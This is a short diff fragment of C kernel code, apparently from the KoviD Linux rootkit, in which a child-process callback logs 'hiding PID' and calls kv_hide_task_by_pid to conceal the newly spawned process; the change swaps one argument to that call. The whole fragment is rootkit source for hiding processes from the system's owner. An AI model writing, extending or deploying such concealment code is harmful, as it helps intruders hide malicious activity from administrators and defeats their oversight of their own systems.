@@ -57,7 +57,7 @@ static int child_initfn(struct subprocess_info *info, struct cred *new)
 	struct hide_data *d = info->data;
 	if (d && d->hide) {
 		prinfo("KoviD: child_initfn -> hiding PID=%d\n", current->pid);
-		kv_hide_task_by_pid(current->pid, 0, CHILDREN);
+		kv_hide_task_by_pid(current->pid, 0, true);
 	}
 	return 0;
 }
